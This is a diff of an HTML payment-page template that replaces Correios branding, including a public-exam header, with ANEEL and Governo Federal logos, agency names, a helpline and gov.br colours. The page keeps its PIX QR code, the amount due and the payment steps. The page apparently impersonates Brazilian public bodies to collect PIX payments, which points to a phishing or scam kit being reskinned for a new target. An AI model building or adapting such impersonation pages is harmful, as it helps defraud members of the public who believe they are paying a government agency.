@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Correios - Pagamento</title>
+    <title>ANEEL - Pagamento</title>
 
     <!-- Preload fonts -->
     <link rel="preload" href="{{ url_for('static', filename='fonts/rawline-400.woff2') }}" as="font" type="font/woff2" crossorigin>
@@ -15,16 +15,52 @@
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet">
 
     <style>
+        :root {
+            --focus-color: #C6D1EB;
+            --active-color: #1351B4;
+            --text-color: #1B1B1B;
+            --background-color: #F8F8F8;
+            --button-green: #1B8138;
+            --button-green-dark: #146C2E;
+        }
+
         body {
             font-family: 'rawline', sans-serif;
             -webkit-font-smoothing: antialiased;
             -moz-osx-font-smoothing: grayscale;
+            background-color: var(--background-color);
+            color: var(--text-color);
         }
+
         .animate-spin {
             animation: spin 1s linear infinite;
         }
+
         @keyframes spin {
             to { transform: rotate(360deg); }
+        }
+
+        .gov-button {
+            background-color: var(--button-green);
+            color: white;
+            padding: 0.75rem 1.5rem;
+            border-radius: 0.25rem;
+            font-weight: 600;
+            transition: background-color 0.2s;
+        }
+
+        .gov-button:hover {
+            background-color: var(--button-green-dark);
+        }
+
+        .gov-header {
+            background-color: var(--active-color);
+            color: white;
+        }
+
+        .gov-footer {
+            background-color: var(--active-color);
+            color: white;
         }
     </style>
     <script>
@@ -32,8 +68,9 @@
             theme: {
                 extend: {
                     colors: {
-                        'correios-blue': '#003399',
-                        'correios-yellow': '#FEEF37',
+                        'gov-blue': '#1351B4',
+                        'gov-yellow': '#FFCD07',
+                        'gov-green': '#1B8138',
                     }
                 }
             }
@@ -79,52 +116,43 @@
         }
     </script>
 </head>
-<body class="bg-gray-50 min-h-screen flex flex-col">
+<body class="min-h-screen flex flex-col">
     <!-- Header -->
-    <div class="bg-correios-yellow py-4">
-        <div class="container mx-auto px-4">
-            <div class="flex flex-col items-center text-center">
-                <img src="https://logodownload.org/wp-content/uploads/2014/05/correios-logo-1-1.png" alt="Logo dos Correios" class="h-12 mb-2" />
-                <div>
-                    <p class="text-correios-blue text-[16px] leading-tight font-bold tracking-wide">
-                        CONCURSO PÚBLICO 2025
-                    </p>
-                    <p class="text-correios-blue text-[12px] leading-tight tracking-wide">
-                        SELEÇÃO EXTERNA PARA MÚLTIPLOS CARGOS
-                    </p>
+    <div class="gov-header">
+        <div class="container mx-auto px-4 py-4">
+            <div class="flex items-center justify-between">
+                <div class="flex items-center space-x-8">
+                    <img src="https://www.gov.br/logo-gov.png" alt="Governo Federal" class="h-8" />
+                    <img src="https://www.gov.br/aneel/pt-br/theme/gov_br_aneel_theme/img/logo-aneel.png" alt="ANEEL" class="h-8" />
+                </div>
+                <div class="text-right">
+                    <p class="text-sm font-medium">Agência Nacional de Energia Elétrica</p>
+                    <p class="text-xs">Governo Federal</p>
                 </div>
             </div>
         </div>
     </div>
 
-    <!-- Blue bar -->
-    <div class="bg-correios-blue py-3 shadow-md">
-        <div class="container mx-auto px-4 flex items-center">
-            <div class="grid grid-cols-2 gap-0.5 mr-3 drop-shadow-sm">
-                <div class="w-2 h-2 bg-white"></div>
-                <div class="w-2 h-2 bg-white"></div>
-                <div class="w-2 h-2 bg-white"></div>
-                <div class="w-2 h-2 bg-white"></div>
-            </div>
-            <span class="text-white text-xl tracking-wide drop-shadow-sm">PAGAMENTO</span>
-        </div>
-    </div>
-
     <!-- Main Content -->
-    <div class="container mx-auto px-4 py-8">
+    <div class="container mx-auto px-4 py-8 flex-grow">
         <div class="max-w-2xl mx-auto">
             <div class="bg-white rounded-lg shadow-md p-6">
+                <div class="mb-6">
+                    <h1 class="text-2xl font-bold text-gov-blue mb-2">Pagamento</h1>
+                    <p class="text-gray-600">Sistema de Pagamento - ANEEL</p>
+                </div>
+
                 {% if pix_data and pix_data.get('pixQrCode') %}
                     <!-- Status do Pagamento com Loader -->
-                    <div class="bg-gray-100 p-6 rounded-lg w-full mb-6">
+                    <div class="bg-gray-50 p-6 rounded-lg w-full mb-6 border border-gray-200">
                         <div class="flex flex-col items-center">
                             <div class="mb-3">
-                                <svg class="animate-spin h-12 w-12 text-gray-400" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                                <svg class="animate-spin h-12 w-12 text-gov-blue" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                                     <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="3"></circle>
                                     <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                                 </svg>
                             </div>
-                            <h2 class="text-2xl font-bold text-gray-800 mb-2">Pagamento Pendente</h2>
+                            <h2 class="text-2xl font-bold text-gov-blue mb-2">Pagamento Pendente</h2>
                             <p class="text-gray-600 mb-4">Valor: <span class="font-bold">R$ {{ valor_total }}</span></p>
 
                             <!-- QR Code e Código PIX -->
@@ -134,7 +162,7 @@
                                 <p class="text-sm text-gray-600">Código PIX:</p>
                                 <input type="text" value="{{ pix_data.pixCode }}" readonly
                                        class="w-full py-2.5 px-3 border rounded bg-gray-50 text-gray-700 text-sm" id="pixCode" />
-                                <button onclick="copyPixCode()" class="w-full bg-green-600 hover:bg-green-700 text-white font-semibold py-2 px-4 rounded transition-colors flex items-center justify-center">
+                                <button onclick="copyPixCode()" class="gov-button w-full flex items-center justify-center">
                                     <i class="fas fa-copy mr-2"></i>
                                     <span>Copiar Código PIX</span>
                                 </button>
@@ -145,19 +173,19 @@
                     <!-- Instruções de Pagamento -->
                     <div class="space-y-4">
                         <div class="flex items-center">
-                            <div class="w-8 h-8 rounded-full bg-correios-blue text-white flex items-center justify-center mr-3">1</div>
+                            <div class="w-8 h-8 rounded-full bg-gov-blue text-white flex items-center justify-center mr-3">1</div>
                             <span>Abra o app do seu banco</span>
                         </div>
                         <div class="flex items-center">
-                            <div class="w-8 h-8 rounded-full bg-correios-blue text-white flex items-center justify-center mr-3">2</div>
+                            <div class="w-8 h-8 rounded-full bg-gov-blue text-white flex items-center justify-center mr-3">2</div>
                             <span>Escolha pagar via PIX</span>
                         </div>
                         <div class="flex items-center">
-                            <div class="w-8 h-8 rounded-full bg-correios-blue text-white flex items-center justify-center mr-3">3</div>
+                            <div class="w-8 h-8 rounded-full bg-gov-blue text-white flex items-center justify-center mr-3">3</div>
                             <span>Escaneie o QR Code ou cole o código PIX</span>
                         </div>
                         <div class="flex items-center">
-                            <div class="w-8 h-8 rounded-full bg-correios-blue text-white flex items-center justify-center mr-3">4</div>
+                            <div class="w-8 h-8 rounded-full bg-gov-blue text-white flex items-center justify-center mr-3">4</div>
                             <span>Confirme o valor e finalize o pagamento</span>
                         </div>
                     </div>
@@ -169,7 +197,7 @@
                         {% else %}
                             <p>Erro ao gerar o QR Code PIX. Por favor, tente novamente.</p>
                         {% endif %}
-                        <a href="/" class="mt-4 inline-block bg-correios-blue text-white px-6 py-2 rounded-lg hover:bg-blue-700">
+                        <a href="/" class="gov-button inline-block mt-4">
                             Voltar ao início
                         </a>
                     </div>
@@ -179,9 +207,19 @@
     </div>
 
     <!-- Footer -->
-    <div class="bg-correios-yellow text-correios-blue text-center py-4 mt-auto">
-        <p class="text-sm font-medium">© {{ current_year }} Empresa Brasileira de Correios e Telégrafos. Todos os direitos reservados.</p>
-        <p class="text-sm mt-1">Central de Atendimento dos Correios - 0800 725 0100</p>
+    <div class="gov-footer py-4">
+        <div class="container mx-auto px-4">
+            <div class="flex flex-col md:flex-row justify-between items-center">
+                <div class="text-center md:text-left mb-4 md:mb-0">
+                    <p class="text-sm font-medium">© {{ current_year }} ANEEL - Agência Nacional de Energia Elétrica</p>
+                    <p class="text-sm mt-1">Todos os direitos reservados</p>
+                </div>
+                <div class="text-center md:text-right">
+                    <p class="text-sm">Central de Atendimento: 167</p>
+                    <p class="text-sm mt-1">www.gov.br/aneel</p>
+                </div>
+            </div>
+        </div>
     </div>
 
     <script>
